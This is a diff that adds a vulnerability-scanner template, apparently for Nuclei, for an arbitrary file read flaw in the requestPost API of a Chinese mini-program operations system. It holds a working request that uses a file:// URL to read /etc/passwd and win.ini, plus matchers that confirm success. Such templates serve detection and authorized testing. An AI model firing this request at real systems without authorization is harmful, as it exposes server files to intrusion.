@@ -1,0 +1,32 @@
+id: poc-yaml-mini-program-operation-system-requestpost-anyfile-read
+info:
+  name: 全行业小程序运营系统 requestPost 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+
+variables:
+  paths:
+    - etc/passwd
+    - C:windows/win.ini
+
+http:
+  - raw:
+      - |
+        GET /api/wxapps/_requestPost?url=file:///{{paths}}&data=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      paths:
+        - etc/passwd
+        - C:windows/win.ini
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "contains(body, 'root:') && contains(body, '/bin')"
+          - "contains(body, '; for 16-bit app support') && contains(body, '[files]')"
